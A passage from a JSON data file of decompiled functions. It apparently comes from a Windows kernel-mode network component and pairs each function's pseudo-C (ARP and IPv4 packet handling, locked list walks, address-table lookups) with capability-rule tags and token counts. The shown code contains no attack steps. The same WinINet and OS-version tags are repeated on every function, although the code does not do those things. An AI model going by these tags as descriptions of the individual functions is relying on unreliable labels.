        "decompiled_code": "\nint32_t __cdecl fcn.0003b760(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_ch = NULL;\n    if (arg_8h == 0) {\n        iVar1 = -0x3ffffff8;\n    }\n    else {\n        fcn.00037640(0x800ce848, &var_8h, 0);\n        var_4h = fcn.0003e2d0(arg_8h, 1, &var_ch);\n        if (var_4h != NULL) {\n            if (var_ch == NULL) {\n                *0x800ce854 = *var_4h;\n            }\n            else {\n                *var_ch = *var_4h;\n            }\n        }\n        fcn.00037670(0x800ce848, &var_8h, 0);\n        if (var_4h != NULL) {\n            if (var_4h[5] != 0) {\n                fcn.00063b20(var_4h[5]);\n                fcn.00063b20(var_4h[5] + 8);\n                fcn.00063b20(var_4h[5] + 0xc);\n                fcn.00063b20(var_4h[5] + 0x10);\n                fcn.00063b20(var_4h[5] + 0x14);\n                fcn.00063b20(var_4h[5] + 4);\n                fcn.000357f0(var_4h[5]);\n            }\n            fcn.000357f0(var_4h);\n        }\n        iVar1 = (-(var_4h != NULL) & 0x3ffffff8) + 0xc0000008;\n    }\n    return iVar1;\n}\n",
        "token_count": 430
    },
    "0003b880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0003b880(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    while( true ) {\n        fcn.00037640(0x800ce848, &var_8h, 1);\n        var_4h = *0x800ce854;\n        if (*0x800ce854 != 0) {\n            var_ch = *(*0x800ce854 + 8);\n        }\n        fcn.00037670(0x800ce848, &var_8h, 1);\n        if (var_4h == 0) break;\n        fcn.0003b760(var_ch);\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "0003b8f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003b8f0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (((arg_8h == 0) && (arg_ch == 0)) || ((arg_8h != 0 && (arg_ch != 0)))) {\n        var_ch = 0xc00000ef;\n    }\n    else {\n        if (arg_14h == 0) {\n            fcn.00037640(0x800ce848, &var_4h, 0);\n        }\n        if (arg_ch == 0) {\n            var_8h = fcn.0003dd70(arg_8h, 0);\n        }\n        else {\n            var_8h = fcn.0003b9a0(arg_ch, 0);\n        }\n        if (var_8h == 0) {\n            var_ch = 0xc000000d;\n        }\n        else {\n            *(var_8h + 0x458) = arg_10h;\n            var_ch = 0;\n        }\n        if (arg_14h == 0) {\n            fcn.00037670(0x800ce848, &var_4h, 0);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 313
    },
    "0003b9a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003b9a0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce848, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce840; (var_8h != NULL && (var_8h[0x114] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce848, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 176
    },
    "0003ba10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint32_t __cdecl fcn.0003ba10(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t iVar1;\n    bool bVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t arg_ch_00;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    var_ch = 0;\n    bVar6 = false;\n    bVar2 = false;\n    for (var_4h = *(arg_8h + 4); var_4h != NULL; var_4h = *var_4h) {\n        uVar5 = var_4h[3];\n        fcn.000574b0(0);\n        iVar4 = fcn.000356f0(uVar5);\n        if (iVar4 != 0) {\n            arg_ch_00 = (**0x800ce720)(var_4h, uVar5, iVar4, 0, 0);\n            if (arg_ch_00 == 0) {\n                fcn.000357f0(iVar4);\n            }\n            else {\n                fcn.00037640(0x800ce848, &fcn.0003ba10::var_8h, 0);\n                iVar4 = fcn.0003dd70(arg_ch, 1);\n                if (iVar4 != 0) {\n                    arg_ch = *(iVar4 + 8);\n                    fcn.0004ffd0(arg_ch, arg_ch_00, arg_ch_00 + 0xe, uVar5);\n                    if (*(iVar4 + 0x424) == 0) {\n                        var_ch = 0;\n                    }\n                    else {\n                        arg_ch = *(iVar4 + 0x424);\n                        var_ch = fcn.000643c0(arg_ch);\n                    }\n                }\n                var_4h = 0x3bb2a;\n                fcn.00037670(0x800ce848, &fcn.0003ba10::var_8h, 0);\n                if (var_ch == 0) {\n                    var_10h = uVar5;\n                    if (0xd < uVar5) {\n                        iVar1 = *(arg_ch_00 + 0xc);\n                        var_4h = 0x7ff;\n                        var_8h = 0x3bb4d;\n                        iVar3 = fcn.00035980(0x7ff);\n                        if (iVar1 == iVar3) {\n                            var_ch = 1;\n                        }\n                    }\n                }\n                else {\n                    var_4h = NULL;\n                    var_8h = 0x3bb64;\n                    fcn.000574e0(0);\n                    var_10h = arg_ch;\n                    var_8h = uVar5;\n                    fcn.000401d0(arg_ch, arg_ch_00, uVar5);\n                    var_ch = arg_ch_00;\n                }\n                iVar4 = fcn.00048310(0, arg_ch, 0, 0, var_10h & 0xffff, var_10h & 0xffff, 0);\n                bVar6 = iVar4 == 0;\n                bVar2 = !bVar6;\n                fcn.000357f0(0);\n            }\n        }\n    }\n    if ((bVar6) && (bVar2)) {\n        uVar5 = 0xffffffff;\n    }\n    else {\n        uVar5 = bVar6;\n    }\n    return uVar5;\n}\n",
        "token_count": 999
    },
    "0003bc00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0003bc00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    iVar2 = arg_18h;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h, arg_14h, iVar2, arg_1ch, 0);\n    if (iVar2 == 0) {\n        arg_8h_00 = (**0x80051218)(arg_ch, 0x4e4d4944);\n        if (arg_8h_00 != 0) {\n            fcn.0003b210(arg_8h_00, *(arg_18h + 5));\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 274
    },
    "0003bca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003bca0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = arg_ch;\n    iVar3 = arg_10h;\n    pcVar1 = fcn.00063f30(arg_8h);\n    (*pcVar1)(arg_8h, uVar2, iVar3);\n    if (arg_10h == 0) {\n        fcn.0003b8f0(arg_ch, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "0003bcd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003bcd0(uint arg_8h, int32_t arg_ch, uint *arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_14h = NULL;\n    var_20h = 0;\n    var_1ch = 0;\n    if (((arg_18h == 0) || (arg_ch == 0)) || (arg_10h == NULL)) {\n        pcVar2 = fcn.00063f30(arg_8h);\n        (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    else {\n        fcn.00037640(0x800ce848, &var_4h, 0);\n        iVar3 = fcn.0003dd70(arg_ch, 1);\n        if (((iVar3 != 0) && (*(iVar3 + 0x454) != 0)) && (*(*(iVar3 + 0x454) + 0x14) != 0)) {\n            var_1ch = *(iVar3 + 0x450);\n            var_20h = *(*(*(iVar3 + 0x454) + 0x14) + 0x10);\n        }\n        fcn.00037670(0x800ce848, &var_4h, 0);\n        if (var_20h == 0) {\n            var_10h = arg_18h;\n            var_14h = arg_10h;\n        }\n        else {\n            var_28h = 0;\n            var_24h = NULL;\n            for (var_8h = arg_10h; (var_28h < arg_18h && (var_8h != NULL)); var_8h = *var_8h) {\n                iVar3 = fcn.0003ba10(var_8h, arg_ch);\n                if (iVar3 == 0) {\n                    if (var_14h == NULL) {\n                        var_14h = var_8h;\n                    }\n                    var_10h = var_10h + 1;\n                    var_24h = var_8h;\n                }\n                else {\n                    if (var_10h != 0) {\n                        *var_24h = 0;\n                        uVar5 = arg_8h;\n                        iVar3 = arg_ch;\n                        uVar6 = arg_14h;\n                        uVar4 = arg_1ch;\n                        pcVar2 = fcn.00063f30(arg_8h);\n                        (*pcVar2)(uVar5, iVar3, var_14h, uVar6, var_10h, uVar4);\n                        *var_24h = var_8h;\n                    }\n                    if (((arg_1ch & 2) == 0) && (var_1ch != 0)) {\n                        uVar5 = *var_8h;\n                        *var_8h = 0;\n                        cVar1 = (**0x80051004)();\n                        uVar4 = cVar1 == '\\x02';\n                        iVar3 = var_20h;\n                        iVar7 = var_1ch;\n                        puVar8 = var_8h;\n                        pcVar2 = fcn.00063f30(var_20h);\n                        (*pcVar2)(iVar3, iVar7, puVar8, uVar4);\n                        *var_8h = uVar5;\n                    }\n                    var_10h = 0;\n                    var_14h = NULL;\n                }\n                var_28h = var_28h + 1;\n            }\n        }\n        if (var_10h != 0) {\n            pcVar2 = fcn.00063f30(arg_8h);\n            (*pcVar2)(arg_8h, arg_ch, var_14h, arg_14h, var_10h, arg_1ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 1029
    },
    "0003bef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003bef0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h);\n    if (iVar2 == 0) {\n        fcn.0003b8f0(0, arg_ch, 0, 0);\n    }\n    else if (iVar2 == 0x103) {\n        fcn.0003b8f0(0, arg_ch, 2, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 183
    },
    "0003bf70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003bf70(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h);\n    if (iVar2 == 0) {\n        fcn.0003b8f0(0, arg_ch, 2, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 146
    },
    "0003c010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003c010(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h);\n    if (iVar2 == 0) {\n        fcn.0003b8f0(0, arg_ch, 0, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 146
    },
    "0003c050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003c050(uint arg_8h, uint *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *arg_ch_00;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    iVar1 = fcn.0003f990(arg_8h, 0);\n    if (iVar1 != 0) {\n        var_ch = *(iVar1 + 0x44c);\n    }\n    fcn.00037670(0x800ce848, &var_4h, 0);\n    if (var_ch == 0) {\n        uVar2 = 0xc00000ef;\n    }\n    else {\n        arg_ch_00 = fcn.000356c0(arg_14h + 0xe);\n        if (arg_ch_00 == NULL) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            *arg_ch_00 = *arg_ch;\n            arg_ch_00[1] = arg_ch[1];\n            arg_ch_00[2] = arg_ch[2];\n            *(arg_ch_00 + 3) = *(arg_ch + 3);\n            fcn.00078be8(arg_ch_00 + 0xe, arg_10h, arg_14h);\n            uVar2 = fcn.0003d540(var_ch, arg_ch_00, arg_14h + 0xe);\n            fcn.000357f0(arg_ch_00);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 406
    },
    "0003c140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003c140(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_10h = 0;\n    if (arg_8h == NULL) {\n        var_2ch = -0x3fffff11;\n    }\n    else {\n        fcn.00037640(0x800ce848, &var_8h, 0);\n        iVar2 = fcn.0003f990(arg_ch, 1);\n        if (iVar2 != 0) {\n            var_10h = *(iVar2 + 4);\n        }\n        fcn.00037670(0x800ce848, &var_8h, 0);\n        if (var_10h == 0) {\n            var_2ch = -0x3fffff10;\n        }\n        else {\n            fcn.00078bfa(arg_8h, 0, 0x3c);\n            uVar1 = fcn.00035980(0x806);\n            *(arg_8h + 3) = uVar1;\n            uVar1 = fcn.00035980(1);\n            *(arg_8h + 0xe) = uVar1;\n            uVar1 = fcn.00035980(0x800);\n            *(arg_8h + 4) = uVar1;\n            *(arg_8h + 0x12) = 6;\n            *(arg_8h + 0x13) = 4;\n            iVar2 = (**0x800ce718)(*0x800ce874, 8, 0);\n            if (iVar2 == 0) {\n                var_2ch = -0x3fffff66;\n            }\n            else {\n                iVar3 = (**0x800ce74c)();\n                *(iVar2 + 100) = iVar3 << 0x18;\n                *(iVar2 + 0x3c) = var_10h;\n                var_4h = *(iVar2 + 4);\n                if (var_4h == 0) {\n                    var_2ch = -0x3fffff66;\n                }\n                else {\n                    iVar3 = *(var_4h + 0x10);\n                    if ((*(iVar3 + 6) & 5) == 0) {\n                        var_30h = (**0x800510e4)(iVar3, 0, 1, 0, 0, 0x20);\n                    }\n                    else {\n                        var_30h = *(iVar3 + 0xc);\n                    }\n                    if ((var_30h == NULL) || (*(iVar3 + 0x14) < 0x3c)) {\n                        var_2ch = -0x3fffff66;\n                    }\n                    else {\n                        for (iVar3 = 0xf; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *var_30h = *arg_8h;\n                            arg_8h = arg_8h + 1;\n                            var_30h = var_30h + 1;\n                        }\n                        *(var_4h + 0xc) = 0x3c;\n                        *(var_4h + 0x14) = 0;\n                        *(var_4h + 8) = 0;\n                        *arg_10h = iVar2;\n                        var_2ch = 0;\n                    }\n                }\n            }\n            if ((var_2ch != 0) && (iVar2 != 0)) {\n                (**0x800ce71c)(iVar2);\n            }\n        }\n    }\n    return var_2ch;\n}\n",
        "token_count": 923
    },
    "0003c330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003c330(uint arg_8h, int32_t *arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *arg_10h;\n    iVar2 = fcn.00035980(1);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    iVar1 = arg_10h[1];\n    iVar2 = fcn.00035980(0x800);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    if (*(arg_10h + 2) != '\\x06') {\n        return;\n    }\n    if (*(arg_10h + 5) != '\\x04') {\n        return;\n    }\n    iVar1 = arg_10h[3];\n    iVar2 = fcn.00035980(1);\n    if (iVar1 != iVar2) goto code_r0x0003c5f3;\n    var_10h = 0x800cba30;\n    var_14h = arg_ch;\n    for (var_ch = 6; 3 < var_ch; var_ch = var_ch - 4) {\n        if (*var_14h != *var_10h) goto code_r0x0003c3de;\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 1;\n    }\n    if (var_ch == 0) {\ncode_r0x0003c460:\n        var_1ch = 0;\n    }\n    else {\ncode_r0x0003c3de:\n        var_18h = *var_14h - *var_10h;\n        if (var_18h == 0) {\n            if (var_ch == 1) goto code_r0x0003c460;\n            var_18h = *(var_14h + 1) - *(var_10h + 1);\n            if (var_18h == 0) {\n                if (var_ch == 2) goto code_r0x0003c460;\n                var_18h = *(var_14h + 2) - *(var_10h + 2);\n                if (var_18h == 0) {\n                    if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                    goto code_r0x0003c460;\n                }\n            }\n        }\n        var_1ch = 1;\n        if (var_18h < 1) {\n            var_1ch = -1;\n        }\n    }\n    if (var_1ch != 0) {\ncode_r0x0003c5f3:\n        iVar1 = arg_10h[3];\n        iVar2 = fcn.00035980(2);\n        if (iVar1 == iVar2) {\n            fcn.00050ca0(arg_8h, arg_10h + 4, *(arg_10h + 7), 0);\n        }\n        return;\n    }\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    iVar3 = fcn.0003f990(arg_8h, 1);\n    if (iVar3 == 0) {\n        fcn.00037670(0x800ce848, &var_4h, 0);\n        return;\n    }\n    var_28h = iVar3 + 0x1c;\n    var_2ch = arg_ch + 6;\n    for (var_24h = 6; 3 < var_24h; var_24h = var_24h - 4) {\n        if (*var_2ch != *var_28h) goto code_r0x0003c509;\n        var_28h = var_28h + 1;\n        var_2ch = var_2ch + 1;\n    }\n    if (var_24h == 0) {\ncode_r0x0003c58b:\n        var_34h = 0;\n    }\n    else {\ncode_r0x0003c509:\n        var_30h = *var_2ch - *var_28h;\n        if (var_30h == 0) {\n            if (var_24h == 1) goto code_r0x0003c58b;\n            var_30h = *(var_2ch + 1) - *(var_28h + 1);\n            if (var_30h == 0) {\n                if (var_24h == 2) goto code_r0x0003c58b;\n                var_30h = *(var_2ch + 2) - *(var_28h + 2);\n                if (var_30h == 0) {\n                    if ((var_24h == 3) || (var_30h = *(var_2ch + 3) - *(var_28h + 3),  var_30h == 0))\n                    goto code_r0x0003c58b;\n                }\n            }\n        }\n        var_34h = 1;\n        if (var_30h < 1) {\n            var_34h = -1;\n        }\n    }\n    if (var_34h != 0) {\n        fcn.00050ca0(arg_8h, arg_10h + 4, *(arg_10h + 7), 1);\n        fcn.00050ca0(arg_8h, 0, *(arg_10h + 0xc), 0);\n    }\n    fcn.00037670(0x800ce848, &var_4h, 0);\n    return;\n}\n",
        "token_count": 1411
    },
    "0003c630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0003c630(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t *var_4ch;\n    int32_t *var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    if (arg_8h < 0x65) {\n        iVar1 = *(arg_ch + 0xc);\n        iVar2 = fcn.00035980(0x806);\n        if ((iVar1 == iVar2) && (0x1b < arg_14h)) {\n            fcn.0003c330(arg_8h, arg_ch, arg_10h);\n        }\n        else if ((*0x800db604 == '\\0') && (iVar1 = *(arg_ch + 0xc),  iVar2 = fcn.00035980(0x800),  iVar1 == iVar2)) {\n            var_14h = arg_10h;\n            var_1h._0_1_ = (**0x8005100c)();\n            for (var_8h = 0; var_8h < 0x40; var_8h = var_8h + 1) {\n                if (*(var_8h * 0x30 + -0x7ff255e8) == arg_8h) {\n                    if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x7ff25600)) &&\n                       (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x7ff255f4))) {\n                        var_30h = var_8h * 0x30 + -0x7ff255fc;\n                        var_34h = arg_ch + 6;\n                        for (var_2ch = 6; 3 < var_2ch; var_2ch = var_2ch - 4) {\n                            if (*var_34h != *var_30h) goto code_r0x0003c767;\n                            var_30h = var_30h + 1;\n                            var_34h = var_34h + 1;\n                        }\n                        if (var_2ch == 0) {\ncode_r0x0003c7e9:\n                            var_3ch = 0;\n                        }\n                        else {\ncode_r0x0003c767:\n                            var_38h = *var_34h - *var_30h;\n                            if (var_38h == 0) {\n                                if (var_2ch == 1) goto code_r0x0003c7e9;\n                                var_38h = *(var_34h + 1) - *(var_30h + 1);\n                                if (var_38h == 0) {\n                                    if (var_2ch == 2) goto code_r0x0003c7e9;\n                                    var_38h = *(var_34h + 2) - *(var_30h + 2);\n                                    if (var_38h == 0) {\n                                        if ((var_2ch == 3) || (var_38h = *(var_34h + 3) - *(var_30h + 3),  var_38h == 0)\n                                           ) goto code_r0x0003c7e9;\n                                    }\n                                }\n                            }\n                            var_3ch = 1;\n                            if (var_38h < 1) {\n                                var_3ch = -1;\n                            }\n                        }\n                        if (var_3ch != 0) goto code_r0x0003c85a;\n                        var_24h = *(var_8h * 0x30 + -0x7ff255f0);\n                        var_20h._0_2_ = *(var_8h * 0x30 + -0x7ff255ec);\n                        *(var_8h * 0x30 + -0x7ff255d8) = *(var_8h * 0x30 + -0x7ff255d8) + 1;\ncode_r0x0003c9c8:\n                        var_1ch._2_2_ = 0;\n                        var_1ch._0_2_ = 0;\n                        var_20h._2_2_ = 0;\n                        var_18h._0_2_ = *(arg_ch + 0xc);\n                        fcn.00037640(0x800ce848, &var_28h, 0);\n                        var_10h = fcn.0003f990(arg_8h, 1);\n                        if (var_10h != 0) {\n                            var_20h._2_2_ = *(var_10h + 0x1c);\n                            var_1ch._0_2_ = *(var_10h + 0x1c) >> 0x10;\n                            var_1ch._2_2_ = *(var_10h + 0x20);\n                            var_ch = *(var_10h + 8);\n                        }\n                        fcn.00037670(0x800ce848, &var_28h, 0);\n                        if (var_ch != 0) {\n                            fcn.0003c050(var_ch, &var_24h, arg_10h, arg_14h);\n                        }\n                    }\n                    else {\ncode_r0x0003c85a:\n                        if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x7ff255f4)) &&\n                           (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x7ff25600))) {\n                            var_48h = var_8h * 0x30 + -0x7ff255f0;\n                            var_4ch = arg_ch + 6;\n                            for (var_44h = 6; 3 < var_44h; var_44h = var_44h - 4) {\n                                if (*var_4ch != *var_48h) goto code_r0x0003c8d3;\n                                var_48h = var_48h + 1;\n                                var_4ch = var_4ch + 1;\n                            }\n                            if (var_44h == 0) {\ncode_r0x0003c955:\n                                var_54h = 0;\n                            }\n                            else {\ncode_r0x0003c8d3:\n                                var_50h = *var_4ch - *var_48h;\n                                if (var_50h == 0) {\n                                    if (var_44h == 1) goto code_r0x0003c955;\n                                    var_50h = *(var_4ch + 1) - *(var_48h + 1);\n                                    if (var_50h == 0) {\n                                        if (var_44h == 2) goto code_r0x0003c955;\n                                        var_50h = *(var_4ch + 2) - *(var_48h + 2);\n                                        if (var_50h == 0) {\n                                            if ((var_44h == 3) ||\n                                               (var_50h = *(var_4ch + 3) - *(var_48h + 3),  var_50h == 0))\n                                            goto code_r0x0003c955;\n                                        }\n                                    }\n                                }\n                                var_54h = 1;\n                                if (var_50h < 1) {\n                                    var_54h = -1;\n                                }\n                            }\n                            if (var_54h == 0) {\n                                var_24h = *(var_8h * 0x30 + -0x7ff255fc);\n                                var_20h._0_2_ = *(var_8h * 0x30 + -0x7ff255f8);\n                                *(var_8h * 0x30 + -0x7ff255d4) = *(var_8h * 0x30 + -0x7ff255d4) + 1;\n                                goto code_r0x0003c9c8;\n                            }\n                        }\n                    }\n                }\n            }\n            (**0x80051010)();\n        }\n    }\n    return;\n}\n",
        "token_count": 2045
    },
    "0003ca60": {
        "rules": [
